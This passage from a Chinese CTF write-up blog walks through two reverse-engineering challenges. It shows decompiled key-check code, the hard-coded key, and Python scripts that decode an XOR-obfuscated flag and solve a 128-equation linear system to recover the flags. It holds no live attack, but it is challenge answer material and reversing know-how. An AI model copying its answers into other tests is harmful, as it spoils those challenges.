v6, &amp;v15 == &amp;v15, v5, a1);  sub_4113CF(a1, v8, a2, (int)&amp;v15, &amp;input1);  v9 = system(&quot;pause&quot;);  sub_411235(v11, v10, &amp;v15 == &amp;v15, v9, a1);  v13 = v12;  sub_411258((int)&amp;savedregs, (int)byte_415D18);  return sub_411235((unsigned int)&amp;savedregs ^ v17, v13, 1, 0, a1);&#125;</code></pre><p>输入key之后在下面的函数里进行验证</p><pre><code class="cpp">int __usercall sub_415B10@&lt;eax&gt;(int a1@&lt;xmm0&gt;, char *input1)&#123;  int v2; // eax  int v3; // edx  int v4; // eax  int v5; // edx  int v6; // ecx  int v7; // eax  __int64 v8; // rtt  int v9; // ST04_4  int v10; // ST00_4  int v12; // [esp+0h] [ebp-E8h]  char Str2; // [esp+D0h] [ebp-18h]  char v14; // [esp+D1h] [ebp-17h]  char v15; // [esp+D2h] [ebp-16h]  char v16; // [esp+D3h] [ebp-15h]  char v17; // [esp+D4h] [ebp-14h]  char v18; // [esp+D5h] [ebp-13h]  char v19; // [esp+D6h] [ebp-12h]  char v20; // [esp+D7h] [ebp-11h]  char v21; // [esp+D8h] [ebp-10h]  char v22; // [esp+D9h] [ebp-Fh]  char v23; // [esp+DAh] [ebp-Eh]  char v24; // [esp+DBh] [ebp-Dh]  char v25; // [esp+DCh] [ebp-Ch]  char v26; // [esp+DDh] [ebp-Bh]  char v27; // [esp+DEh] [ebp-Ah]  int v28; // [esp+E4h] [ebp-4h]  int savedregs; // [esp+E8h] [ebp+0h]  sub_41122B((int)&amp;unk_41C032);  Str2 = &#39;w&#39;;  v14 = &#39;a&#39;;  v15 = &#39;n&#39;;  v16 = &#39;g&#39;;  v17 = &#39;z&#39;;  v18 = &#39;h&#39;;  v19 = &#39;e&#39;;  v20 = &#39;r&#39;;  v21 = &#39;o&#39;;  v22 = &#39;n&#39;;  v23 = &#39;g&#39;;  v24 = &#39;y&#39;;  v25 = &#39;a&#39;;  v26 = &#39;o&#39;;  v27 = 0;  v2 = j_strcmp(input1, &amp;Str2);  if ( v2 )  &#123;    target1 = 0;  &#125;  else  &#123;    v4 = rand();    v7 = sub_411235(v6, v5, &amp;v12 == &amp;v12, v4, a1);    v8 = v7;    v2 = v7 / 10;    v3 = v8 % 10;    target1 = v8 % 10;  &#125;  v9 = v3;  v10 = v2;  sub_411258((int)&amp;savedregs, (int)dword_415BEC);  return sub_411235((unsigned int)&amp;savedregs ^ v28, v9, 1, v10, a1);&#125;</code></pre><p>输入的<code>key</code>应该是<code>wangzherongyao</code></p><pre><code class="cpp">int __usercall sub_415770@&lt;eax&gt;(int a1@&lt;xmm0&gt;, int a2@&lt;ecx&gt;, int a3@&lt;ebx&gt;, int a4@&lt;esi&gt;, char *Str)&#123;  size_t v5; // eax  int v6; // eax  int v7; // edx  int v8; // ecx  char v10; // [esp+0h] [ebp-15D8h]  int j; // [esp+610h] [ebp-FC8h]  unsigned int i; // [esp+61Ch] [ebp-FBCh]  int v13; // [esp+15C4h] [ebp-14h]  int v14; // [esp+15C8h] [ebp-10h]  int v15; // [esp+15D0h] [ebp-8h]  int savedregs; // [esp+15D8h] [ebp+0h]  sub_4113ED(0x15D8u, a2);  memset(&amp;v10, 0xCCu, 0x15D8u);  sub_41122B((int)&amp;unk_41C032);  v15 = 0;  for ( i = 0; ; ++i )  &#123;    v5 = j_strlen(Str);    if ( i &gt;= v5 )      break;    v15 += Str[i];  &#125;  for ( j = 0; j &lt; 38; ++j )  &#123;    step2[j] += v15;    step2[j] ^= dword_41A4DC;  &#125;  step2[++j] = 0;  v6 = sub_4113E3(a1, a3, (int)&amp;savedregs, a4, (int)step2);  v14 = v7;  v13 = v6;  sub_411258((int)&amp;savedregs, (int)dword_41589C);  return sub_411235(v8, v14, 1, v13, a1);&#125;</code></pre><p>下面的处理就是把key求和赋值给<code>v15</code>，然后将内容中的数组逐项与<code>v15</code>相加然后异或</p><pre><code class="cpp">int __usercall sub_415970@&lt;eax&gt;(int a1@&lt;xmm0&gt;, int ebx0@&lt;ebx&gt;, int a3@&lt;edi&gt;, int a4@&lt;esi&gt;, int target)&#123;  int v5; // STF0_4  int v6; // eax  int v7; // edx  int v8; // ST04_4  int v9; // ST00_4  signed int i; // [esp+DCh] [ebp-84h]  int v12; // [esp+E8h] [ebp-78h]  int v13; // [esp+E8h] [ebp-78h]  char v14[104]; // [esp+F4h] [ebp-6Ch]  int v15; // [esp+15Ch] [ebp-4h]  int savedregs; // [esp+160h] [ebp+0h]  sub_41122B((int)&amp;unk_41C032);  v12 = 0;  for ( i = 0; i &lt; 9; ++i )  &#123;    v14[v12] = *(_BYTE *)(target + 4 * i);    v5 = v12 + 1;    v14[v5++] = *(_BYTE *)(target + 4 * i + 36);    v14[v5++] = *(_BYTE *)(target + 4 * i + 72);    v14[v5] = *(_BYTE *)(target + 4 * i + 108);    v12 = v5 + 1;  &#125;  v14[v12] = *(_BYTE *)(target + 144);  v13 = v12 + 1;  v14[v13] = *(_BYTE *)(target + 148);  if ( (unsigned int)(v13 + 1) &gt;= 0x64 )    sub_411168(ebx0, a3, a4);  v14[v13 + 1] = 0;  v6 = printf((int)&quot;\n%s\n&quot;, (unsigned int)v14);  v8 = v7;  v9 = v6;  sub_411258((int)&amp;savedregs, (int)dword_415AF0);  return sub_411235((unsigned int)&amp;savedregs ^ v15, v8, 1, v9, a1);&#125;</code></pre><p>之后就是每9位一组，把得到的字符串重新排序然后输出，但是没有这么轻松，输出的是乱码，因为用来异或的数只有在<code>TLS</code>回调函数里面用到了，如果正常运行的话应该是0，并没有什么意义，所以很显然这题只要调试一下输出的应该就是真正的flag，OD装了<code>hidden</code>忘了关掉，调试了一次发现输出还是乱码，干脆直接算出这个数</p><pre><code class="python">step1 = &quot;wangzherongyao&quot;v15 = 0for i in range(len(step1)):    v15 += ord(step1[i])final = [0xFFFFF9A6, 0xFFFFF991, 0xFFFFF9D3, 0xFFFFF9A8, 0xFFFFF9DC, 0xFFFFF9D5, 0xFFFFF9DC, 0xFFFFF9D4, 0xFFFFF9D8,         0xFFFFF9A0, 0xFFFFF9D3, 0xFFFFF9A7, 0xFFFFF9A8, 0xFFFFF9D4, 0xFFFFF9DB, 0xFFFFF9A9, 0xFFFFF9D3, 0xFFFFF9A8,         0xFFFFF9AB, 0xFFFFF9D3, 0xFFFFF9DA, 0xFFFFF9D6, 0xFFFFF9D4, 0xFFFFF9AB, 0xFFFFF9AB, 0xFFFFF9DB, 0xFFFFF9A9,         0xFFFFF9A5, 0xFFFFF9D6, 0xFFFFF9A8, 0xFFFFF9D8, 0xFFFFF9A6, 0xFFFFF9A6, 0xFFFFF9AB, 0xFFFFF9AA, 0xFFFFF9D6,         0xFFFFF9D9, 0xFFFFF98F]for i in range(38):    final[i] = (final[i] + v15) &amp; 0xffv = final[0] ^ ord(&#39;f&#39;)for i in range(38):    final[i] = final[i] ^ vflag = &quot;&quot;for i in range(9):    flag += chr(final[i])    flag += chr(final[i + 9])    flag += chr(final[i + 9 * 2])    flag += chr(final[i + 9 * 3])flag += chr(final[36]) + chr(final[37])print(flag)# flag&#123;9969e2ddd64088f71af0caa891b4dc63&#125;</code></pre><h4 id="BBBigEqSet"><a href="#BBBigEqSet" class="headerlink" title="BBBigEqSet"></a>BBBigEqSet</h4><p>打开发现函数很大，有很多式子，无脑<code>z3</code>必定跑不出来，下面只截取了一部分</p><pre><code class="cpp">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3; // edx  int v4; // edx  int v5; // edx  int v6; // edx  int v7; // edx  int v8; // edx  int v9; // edx  int v10; // edx  int v11; // edx  int v12; // edx  int v13; // edx  int v14; // edx  int v15; // edx  int v16; // edx  int v17; // edx  int v18; // edx  int v19; // edx  int v20; // edx  int v21; // edx  int v22; // edx  int v23; // edx  int v24; // edx  int v25; // edx  int v26; // edx  int v27; // edx  int v28; // edx  int v29; // edx  int v30; // edx  int v31; // edx  int v32; // edx  int v33; // edx  int v34; // edx  int v35; // edx  int v36; // edx  int v37; // edx  int v38; // edx  int v39; // edx  int v40; // edx  int v41; // edx  int v42; // edx  int v43; // edx  int v44; // edx  int v45; // edx  int v46; // edx  int v47; // edx  int v48; // edx  int v49; // edx  int v50; // edx  int v51; // edx  int v52; // edx  int v53; // edx  int v54; // edx  int v55; // edx  int v56; // edx  int v57; // edx  int v58; // edx  int v59; // edx  int v60; // edx  int v61; // edx  int v62; // edx  int v63; // edx  int v64; // edx  int v65; // edx  int v66; // edx  int v67; // edx  int v68; // edx  int v69; // edx  int v70; // edx  int v71; // edx  int v72; // edx  int v73; // edx  int v74; // edx  int v75; // edx  int v76; // edx  int v77; // edx  int v78; // edx  int v79; // edx  int v80; // edx  int v81; // edx  int v82; // edx  int v83; // edx  int v84; // edx  int v85; // edx  int v86; // edx  int v87; // edx  int v88; // edx  int v89; // edx  int v90; // edx  int v91; // edx  int v92; // edx  int v93; // edx  int v94; // edx  int v95; // edx  int v96; // edx  int v97; // edx  int v98; // edx  int v99; // edx  int v100; // edx  int v101; // edx  int v102; // edx  int v103; // edx  int v104; // edx  int v105; // edx  int v106; // edx  int v107; // edx  int v108; // edx  int v109; // edx  int v110; // edx  int v111; // edx  int v112; // edx  int v113; // edx  int v114; // edx  int v115; // edx  int v116; // edx  int v117; // edx  int v118; // edx  int v119; // edx  int v120; // edx  int v121; // edx  int v122; // edx  int v123; // edx  int v124; // edx  int v125; // edx  int v126; // edx  int v127; // edx  int v128; // edx  int v129; // edx  int v130; // edx  int v131; // edx  int v132; // edx  int v133; // edx  int v134; // edx  int v135; // edx  int v136; // edx  int v137; // edx  int v138; // edx  int v139; // edx  int v140; // edx  int v141; // edx  int v142; // edx  int v143; // edx  int v144; // edx  int v145; // edx  int v146; // edx  int v147; // edx  int v148; // edx  int v149; // edx  int v150; // edx  int v151; // edx  int v152; // edx  int v153; // edx  int v154; // edx  int v155; // edx  int v156; // edx  int v157; // edx  int v158; // edx  int v159; // edx  int v160; // edx  int v161; // edx  int v162; // edx  int v163; // edx  int v164; // edx  int v165; // edx  int v166; // edx  int v167; // edx  int v168; // edx  int v169; // edx  int v170; // edx  int v171; // edx  int v172; // edx  int v173; // edx  int v174; // edx  int v175; // edx  int v176; // edx  int v177; // edx  int v178; // edx  int v179; // edx  int v180; // edx  int v181; // edx  int v182; // edx  int v183; // edx  int v184; // edx  int v185; // edx  int v186; // edx  int v187; // edx  int v188; // edx  int v189; // edx  int v190; // edx  int v191; // edx  int v192; // edx  int v193; // edx  int v194; // edx  int v195; // edx  int v196; // edx  int v197; // edx  int v198; // edx  int v199; // edx  int v200; // edx  int v201; // edx  int v202; // edx  int v203; // edx  int v204; // edx  int v205; // edx  int v206; // edx  int v207; // edx  int v208; // edx  int v209; // edx  int v210; // edx  int v211; // edx  int v212; // edx  int v213; // edx  int v214; // edx  int v215; // edx  int v216; // edx  int v217; // edx  int v218; // edx  int v219; // edx  int v220; // edx  int v221; // edx  int v222; // edx  int v223; // edx  int v224; // edx  int v225; // edx  int v226; // edx  int v227; // edx  int v228; // edx  int v229; // edx  int v230; // edx  int v231; // edx  int v232; // edx  int v233; // edx  int v234; // edx  int v235; // edx  int v236; // edx  int v237; // edx  int v238; // edx  int v239; // edx  int v240; // edx  int v241; // edx  int v242; // edx  int v243; // edx  int v244; // edx  int v245; // edx  int v246; // edx  int v247; // edx  int v248; // edx  int v249; // edx  int v250; // edx  int v251; // edx  int v252; // edx  int v253; // edx  int v254; // edx  int v255; // edx  int v256; // edx  int v257; // edx  int v258; // edx  int v259; // edx  int v260; // edx  int v261; // edx  int v262; // edx  int v263; // edx  int v264; // edx  int v265; // edx  int v266; // edx  int v267; // edx  int v268; // edx  int v269; // edx  int v270; // edx  int v271; // edx  int v272; // edx  int v273; // edx  int v274; // edx  int v275; // edx  int v276; // edx  int v277; // edx  int v278; // edx  int v279; // edx  int v280; // edx  int v281; // edx  int v282; // edx  int v283; // edx  int v284; // edx  int v285; // edx  int v286; // edx  int v287; // edx  int v288; // edx  int v289; // edx  int v290; // edx  int v291; // edx  int v292; // edx  int v293; // edx  int v294; // edx  int v295; // edx  int v296; // edx  int v297; // edx  int v298; // edx  int v299; // edx  int v300; // edx  int v301; // edx  int v302; // edx  int v303; // edx  int v304; // edx  int v305; // edx  int v306; // edx  int v307; // edx  int v308; // edx  int v309; // edx  int v310; // edx  int v311; // edx  int v312; // edx  int v313; // edx  int v314; // edx  int v315; // edx  int v316; // edx  int v317; // edx  int v318; // edx  int v319; // edx  int v320; // edx  int v321; // edx  int v322; // edx  int v323; // edx  int v324; // edx  int v325; // edx  int v326; // edx  int v327; // edx  int v328; // edx  int v329; // edx  int v330; // edx  int v331; // edx  int v332; // edx  int v333; // edx  int v334; // edx  int v335; // edx  int v336; // edx  int v337; // edx  int v338; // edx  int v339; // edx  int v340; // edx  int v341; // edx  int v342; // edx  int v343; // edx  int v344; // edx  int v345; // edx  int v346; // edx  int v347; // edx  int v348; // edx  int v349; // edx  int v350; // edx  int v351; // edx  int v352; // edx  int v353; // edx  int v354; // edx  int v355; // edx  int v356; // edx  int v357; // edx  int v358; // edx  int v359; // edx  int v360; // edx  int v361; // edx  int v362; // edx  int v363; // edx  int v364; // edx  int v365; // edx  int v366; // edx  int v367; // edx  int v368; // edx  int v369; // edx  int v370; // edx  int v371; // edx  int v372; // edx  int v373; // edx  int v374; // edx  int v375; // edx  int v376; // edx  int v377; // edx  int v378; // edx  int v379; // edx  int v380; // edx  int v381; // edx  int v382; // edx  int v383; // edx  int v384; // edx  int v385; // edx  int v386; // edx  char s; // [rsp+0h] [rbp-100h]  char v388; // [rsp+1h] [rbp-FFh]  char v389; // [rsp+2h] [rbp-FEh]  char v390; // [rsp+3h] [rbp-FDh]  char v391; // [rsp+4h] [rbp-FCh]  char v392; // [rsp+5h] [rbp-FBh]  char v393; // [rsp+6h] [rbp-FAh]  char v394; // [rsp+7h] [rbp-F9h]  char v395; // [rsp+8h] [rbp-F8h]  char v396; // [rsp+9h] [rbp-F7h]  char v397; // [rsp+Ah] [rbp-F6h]  char v398; // [rsp+Bh] [rbp-F5h]  char v399; // [rsp+Ch] [rbp-F4h]  char v400; // [rsp+Dh] [rbp-F3h]  char v401; // [rsp+Eh] [rbp-F2h]  char v402; // [rsp+Fh] [rbp-F1h]  char v403; // [rsp+10h] [rbp-F0h]  char v404; // [rsp+11h] [rbp-EFh]  char v405; // [rsp+12h] [rbp-EEh]  char v406; // [rsp+13h] [rbp-EDh]  char v407; // [rsp+14h] [rbp-ECh]  char v408; // [rsp+15h] [rbp-EBh]  char v409; // [rsp+16h] [rbp-EAh]  char v410; // [rsp+17h] [rbp-E9h]  char v411; // [rsp+18h] [rbp-E8h]  char v412; // [rsp+19h] [rbp-E7h]  char v413; // [rsp+1Ah] [rbp-E6h]  char v414; // [rsp+1Bh] [rbp-E5h]  char v415; // [rsp+1Ch] [rbp-E4h]  char v416; // [rsp+1Dh] [rbp-E3h]  char v417; // [rsp+1Eh] [rbp-E2h]  char v418; // [rsp+1Fh] [rbp-E1h]  char v419; // [rsp+20h] [rbp-E0h]  char v420; // [rsp+21h] [rbp-DFh]  char v421; // [rsp+22h] [rbp-DEh]  char v422; // [rsp+23h] [rbp-DDh]  char v423; // [rsp+24h] [rbp-DCh]  char v424; // [rsp+25h] [rbp-DBh]  char v425; // [rsp+26h] [rbp-DAh]  char v426; // [rsp+27h] [rbp-D9h]  char v427; // [rsp+28h] [rbp-D8h]  char v428; // [rsp+29h] [rbp-D7h]  char v429; // [rsp+2Ah] [rbp-D6h]  char v430; // [rsp+2Bh] [rbp-D5h]  char v431; // [rsp+2Ch] [rbp-D4h]  char v432; // [rsp+2Dh] [rbp-D3h]  char v433; // [rsp+2Eh] [rbp-D2h]  char v434; // [rsp+2Fh] [rbp-D1h]  char v435; // [rsp+30h] [rbp-D0h]  char v436; // [rsp+31h] [rbp-CFh]  char v437; // [rsp+32h] [rbp-CEh]  char v438; // [rsp+33h] [rbp-CDh]  char v439; // [rsp+34h] [rbp-CCh]  char v440; // [rsp+35h] [rbp-CBh]  char v441; // [rsp+36h] [rbp-CAh]  char v442; // [rsp+37h] [rbp-C9h]  char v443; // [rsp+38h] [rbp-C8h]  char v444; // [rsp+39h] [rbp-C7h]  char v445; // [rsp+3Ah] [rbp-C6h]  char v446; // [rsp+3Bh] [rbp-C5h]  char v447; // [rsp+3Ch] [rbp-C4h]  char v448; // [rsp+3Dh] [rbp-C3h]  char v449; // [rsp+3Eh] [rbp-C2h]  char v450; // [rsp+3Fh] [rbp-C1h]  char v451; // [rsp+40h] [rbp-C0h]  char v452; // [rsp+41h] [rbp-BFh]  char v453; // [rsp+42h] [rbp-BEh]  char v454; // [rsp+43h] [rbp-BDh]  char v455; // [rsp+44h] [rbp-BCh]  char v456; // [rsp+45h] [rbp-BBh]  char v457; // [rsp+46h] [rbp-BAh]  char v458; // [rsp+47h] [rbp-B9h]  char v459; // [rsp+48h] [rbp-B8h]  char v460; // [rsp+49h] [rbp-B7h]  char v461; // [rsp+4Ah] [rbp-B6h]  char v462; // [rsp+4Bh] [rbp-B5h]  char v463; // [rsp+4Ch] [rbp-B4h]  char v464; // [rsp+4Dh] [rbp-B3h]  char v465; // [rsp+4Eh] [rbp-B2h]  char v466; // [rsp+4Fh] [rbp-B1h]  char v467; // [rsp+50h] [rbp-B0h]  char v468; // [rsp+51h] [rbp-AFh]  char v469; // [rsp+52h] [rbp-AEh]  char v470; // [rsp+53h] [rbp-ADh]  char v471; // [rsp+54h] [rbp-ACh]  char v472; // [rsp+55h] [rbp-ABh]  char v473; // [rsp+56h] [rbp-AAh]  char v474; // [rsp+57h] [rbp-A9h]  char v475; // [rsp+58h] [rbp-A8h]  char v476; // [rsp+59h] [rbp-A7h]  char v477; // [rsp+5Ah] [rbp-A6h]  char v478; // [rsp+5Bh] [rbp-A5h]  char v479; // [rsp+5Ch] [rbp-A4h]  char v480; // [rsp+5Dh] [rbp-A3h]  char v481; // [rsp+5Eh] [rbp-A2h]  char v482; // [rsp+5Fh] [rbp-A1h]  char v483; // [rsp+60h] [rbp-A0h]  char v484; // [rsp+61h] [rbp-9Fh]  char v485; // [rsp+62h] [rbp-9Eh]  char v486; // [rsp+63h] [rbp-9Dh]  char v487; // [rsp+64h] [rbp-9Ch]  char v488; // [rsp+65h] [rbp-9Bh]  char v489; // [rsp+66h] [rbp-9Ah]  char v490; // [rsp+67h] [rbp-99h]  char v491; // [rsp+68h] [rbp-98h]  char v492; // [rsp+69h] [rbp-97h]  char v493; // [rsp+6Ah] [rbp-96h]  char v494; // [rsp+6Bh] [rbp-95h]  char v495; // [rsp+6Ch] [rbp-94h]  char v496; // [rsp+6Dh] [rbp-93h]  char v497; // [rsp+6Eh] [rbp-92h]  char v498; // [rsp+6Fh] [rbp-91h]  char v499; // [rsp+70h] [rbp-90h]  char v500; // [rsp+71h] [rbp-8Fh]  char v501; // [rsp+72h] [rbp-8Eh]  char v502; // [rsp+73h] [rbp-8Dh]  char v503; // [rsp+74h] [rbp-8Ch]  char v504; // [rsp+75h] [rbp-8Bh]  char v505; // [rsp+76h] [rbp-8Ah]  char v506; // [rsp+77h] [rbp-89h]  char v507; // [rsp+78h] [rbp-88h]  char v508; // [rsp+79h] [rbp-87h]  char v509; // [rsp+7Ah] [rbp-86h]  char v510; // [rsp+7Bh] [rbp-85h]  char v511; // [rsp+7Ch] [rbp-84h]  char v512; // [rsp+7Dh] [rbp-83h]  char v513; // [rsp+7Eh] [rbp-82h]  char v514; // [rsp+7Fh] [rbp-81h]  printf(&quot;Give me Flag:&quot;, argv, envp);  __isoc99_scanf(&quot;%128s&quot;, &amp;s);  if ( strlen(&amp;s) == 128 )  &#123;    v3 = 64538 * v429       + 42900 * v428       + 18329 * v427       + 60412 * v426       + 60307 * v425       + 18530 * v424       + 51121 * v423       + 50282 * v422       + 46722 * v421       + 44487 * v420       + 38419 * v419       + 46190 * v418       + 18243 * v417       + 40252 * v416       + 41765 * v415       + 20132 * v414       + 21211 * v413       + 27153 * v412       + 46112 * v411       + 59321 * v410       + 49412 * v409       + 42549 * v408       + 21824 * v407       + 21129 * v406       + 18066 * v405       + 43022 * v404       + 54055 * v403       + 38707 * v402       + 48128 * v401       + 60067 * v400       + 36126 * v399       + 27472 * v398       + 19052 * v397       + 40829 * v396       + 39355 * v395       + 61052 * v394       + 40870 * v393       + 57038 * v392       + 32494 * v391       + 27938 * v390       + 19407 * v389       + 24781 * v388       + 37921 * s;    v4 = 24771 * v471       + 33991 * v470       + 31417 * v469       + 59818 * v468       + 39294 * v467       + 36226 * v466       + 39486 * v465       + 57710 * v464       + 42226 * v463       + 49425 * v462       + 36772 * v461       + 28905 * v460       + 56121 * v459       + 52847 * v458       + 42837 * v457       + 49578 * v456       + 40181 * v455       + 40989 * v454       + 49484 * v453       + 51756 * v452       + 63499 * v451       + 24443 * v450       + 44983 * v449       + 29121 * v448       + 45920 * v447       + 31270 * v446       + 32548 * v445       + 42180 * v444       + 28781 * v443       + 20664 * v442       + 31970 * v441       + 37429 * v440       + 61803 * v439       + 33044 * v438       + 56440 * v437       + 37835 * v436       + 32992 * v435       + 52454 * v434       + 65272 * v433       + 37799 * v432       + 50401 * v431       + 31920 * v430       + v3;    v5 = 48499 * v513       + 18203 * v512       + 65067 * v511       + 30665 * v510       + 58990 * v509       + 37148 * v508       + 61681 * v507       + 51316 * v506       + 64090 * v505       + 57189 * v504       + 58206 * v503       + 52880 * v502       + 56821 * v501       + 21676 * v500       + 28817 * v499       + 20060 * v498       + 24492 * v497       + 52094 * v496       + 63505 * v495       + 57244 * v494       + 50929 * v493       + 61554 * v492       + 51708 * v491       + 65257 * v490       + 37567 * v489       + 54352 * v488       + 55426 * v487       + 49466 * v486       + 28952 * v485       + 47589 * v484       + 22287 * v483       + 49762 * v482       + 58791 * v481       + 30764 * v480       + 40171 * v479       + 26026 * v478       + 31717 * v477       + 54297 * v476       + 53803 * v475       + 62356 * v474       + 37562 * v473       + 47359 * v472       + v4;    if ( v5 + 33908 * v514 == 451221610 )    &#123;        ............            if ( v380 + 48903 * v514 == 428074321 )                                                                                                                                                                                                                                                              &#123;                                                                                                                                                                                                                                                                v381 = 18255 * v429 + 27862 * v428 + 49507 * v427 + 50734 * v426 + 46584 * v425 + 22147 * v424 + 37539 * v423 + 47096 * v422 + 46464 * v421 + 36058 * v420 + 22895 * v419 + 41196 * v418 + 56603 * v417 + 54009 * v416 + 31454 * v415 + 23228 * v414 + 39219 * v413 + 54012 * v412 + 40791 * v411 + 60791 * v410 + 60818 * v409 + 57486 * v408 + 46241 * v407 + 24079 * v406 + 40128 * v405 + 47273 * v404 + 40612 * v403 + 32341 * v402 + 20015 * v401 + 38073 * v400 + 41230 * v399 + 61648 * v398 + 33734 * v397 + 61659 * v396 + 61614 * v395 + 52377 * v394 + 46854 * v393 + 21778 * v392 + 56660 * v391 + 63546 * v390 + 28059 * v389 + 23740 * v388 + 51085 * s;                                                                                                                                                                                                                                                                v382 = 32419 * v471 + 25641 * v470 + 45499 * v469 + 19322 * v468 + 43032 * v467 + 23307 * v466 + 55448 * v465 + 53137 * v464 + 28623 * v463 + 18253 * v462 + 22115 * v461 + 49428 * v460 + 53125 * v459 + 55383 * v458 + 33400 * v457 + 56702 * v456 + 26964 * v455 + 61361 * v454 + 61475 * v453 + 24641 * v452 + 44331 * v451 + 45772 * v450 + 26200 * v449 + 16929 * v448 + 54818 * v447 + 51368 * v446 + 53472 * v445 + 32905 * v444 + 29339 * v443 + 46501 * v442 + 41223 * v441 + 51734 * v440 + 28049 * v439 + 29015 * v438 + 21595 * v437 + 61661 * v436 + 38454 * v435 + 42127 * v434 + 20790 * v433 + 46685 * v432 + 59201 * v431 + 18163 * v430 + v381;                                                                                                                                                                                                                                                                v383 = 59175 * v513 + 39108 * v512 + 47897 * v511 + 30517 * v510 + 48502 * v509 + 21234 * v508 + 16881 * v507 + 33497 * v506 + 44346 * v505 + 34046 * v504 + 62689 * v503 + 61793 * v502 + 39949 * v501 + 51645 * v500 + 45006 * v499 + 30211 * v498 + 36412 * v497 + 50291 * v496 + 61936 * v495 + 24289 * v494 + 36906 * v493 + 39057 * v492 + 37973 * v491 + 38451 * v490 + 44004 * v489 + 36870 * v488 + 41842 * v487 + 56352 * v486 + 44525 * v485 + 55182 * v484 + 61692 * v483 + 22202 * v482 + 46291 * v481 + 43770 * v480 + 33996 * v479 + 16488 * v478 + 41249 * v477 + 30433 * v476 + 19083 * v475 + 64629 * v474 + 39094 * v473 + 20548 * v472 + v382;                                                                                                                                                                                                                                                                if ( v383 + 48644 * v514 == 436619163 )                                                                                                                                                                                                                                                                &#123;                                                                                                                                                                                                                                                                  v384 = 20405 * v429 + 55744 * v428 + 53951 * v427 + 58954 * v426 + 58301 * v425 + 43146 * v424 + 50020 * v423 + 57986 * v422 + 32136 * v421 + 54559 * v420 + 36067 * v419 + 55753 * v418 + 52141 * v417 + 19801 * v416 + 51943 * v415 + 52352 * v414 + 59995 * v413 + 61920 * v412 + 21345 * v411 + 36243 * v410 + 24006 * v409 + 57833 * v408 + 60630 * v407 + 26409 * v406 + 55315 * v405 + 55536 * v404 + 56726 * v403 + 35936 * v402 + 52089 * v401 + 23346 * v400 + 37583 * v399 + 28011 * v398 + 63252 * v397 + 45544 * v396 + 31278 * v395 + 53351 * v394 + 59214 * v393 + 56389 * v392 + 21264 * v391 + 43663 * v390 + 50056 * v389 + 29807 * v388 + 54629 * s;                                                                                                                                                                                                                                                                  v385 = 34777 * v471 + 31197 * v470 + 30616 * v469 + 36452 * v468 + 26811 * v467 + 36716 * v466 + 56574 * v465 + 26609 * v464 + 61561 * v463 + 53940 * v462 + 42728 * v461 + 47488 * v460 + 27142 * v459 + 43536 * v458 + 50520 * v457 + 23098 * v456 + 26887 * v455 + 20179 * v454 + 50829 * v453 + 52275 * v452 + 46516 * v451 + 63611 * v450 + 59165 * v449 + 64759 * v448 + 38581 * v447 + 59893 * v446 + 30951 * v445 + 40268 * v444 + 49167 * v443 + 21028 * v442 + 51890 * v441 + 46565 * v440 + 17053 * v439 + 62330 * v438 + 51110 * v437 + 47835 * v436 + 62399 * v435 + 57967 * v434 + 24624 * v433 + 64106 * v432 + 25896 * v431 + 50027 * v430 + v384;                                                                                                                                                                                                                                                                  v386 = 43090 * v513 + 60146 * v512 + 58416 * v511 + 17103 * v510 + 39414 * v509 + 32649 * v508 + 45967 * v507 + 20158 * v506 + 37299 * v505 + 20670 * v504 + 46301 * v503 + 31897 * v502 + 62016 * v501 + 63284 * v500 + 32156 * v499 + 40720 * v498 + 36471 * v497 + 27360 * v496 + 50777 * v495 + 25651 * v494 + 64743 * v493 + 59790 * v492 + 22455 * v491 + 64238 * v490 + 37757 * v489 + 60849 * v488 + 30086 * v487 + 34636 * v486 + 18797 * v485 + 33985 * v484 + 46073 * v483 + 24947 * v482 + 48851 * v481 + 24773 * v480 + 41489 * v479 + 17636 * v478 + 32373 * v477 + 35731 * v476 + 19021 * v475 + 17532 * v474 + 63794 * v473 + 44087 * v472 + v385;                                                                                                                                                                                                                                                                  if ( v386 + 55482 * v514 == 452784657 )                                                                                                                                                                                                                                                                  &#123;                                                                                                                                                                                                                                                                    puts(&quot;YOU GET IT! YEEEEEAAA&quot;);                                                                                                                                                                                                                                                                    exit(0);                                                                                                                                                                                                                                                                  &#125;                                                                                                                                                                                                                                                                  .........</code></pre><p>观察一下很容易发现，这就是个简单的矩阵乘法，算<code>AX=b</code>，解起来很轻松，但是数据是在太多了，只能写脚本处理一下，本着简单使用的原则，把所有的数字找出来然后提取大于515的部分，就是所有用到的数，观察一下发现每一个处理变量的位置都是不变的，所以对应的数据的位置也是不变的，所以按照顺序提取一下就行了，最后再调整一下顺序就出来了</p><pre><code class="python">import reimport numpy as nps = &quot;&quot;with open(&#39;bigequition.txt&#39;, &#39;r+&#39;) as f:    s += f.read()num = re.findall(&#39;\d+&#39;, s)nums = []for i in num:    tmp = int(i)    if tmp &gt; 515:        nums.append(tmp)arr = []result = []for i in range(128):    t_tmp = []    for j in range(128):        t_tmp.append(nums[129 * i + j])    arr.append(t_tmp)    result.append(nums[129 * i + 128])# print(arr)# print(result)A = np.array(arr)B = np.array([result])b = np.transpose(B)A_inv = np.linalg.inv(A)x = np.dot(A_inv, b)x = np.rint(x)flag = &quot;&quot;for i in range(43):    flag += chr(int(x[42 - i]))for i in range(42):    flag += chr(int(x[43 + 41 - i]))for i in range(42):    flag += chr(int(x[43 + 42 + 41 - i]))flag += chr(int(x[-1]))print(flag)# flag&#123;Soooo000_LooOOOOOOOOggO99g99_s1muLtaNeOus_EEEQuat10n5_Y0UUUUUUuuu_cAA44AANNnnN_SOOOOOOLVE_IT17TT11771ITIT!!!_8ShotDshP90ab&#125;</code></pre><p><del>本来没想到这题这么简单，放假玩了一天晚上睡前才看了一眼，错过一血，错亿</del></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> 36DCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界_echo-server_wp</title>
      <link href="/2020/03/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-echo-server-wp/"/>
      <url>/2020/03/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-echo-server-wp/</url>
      
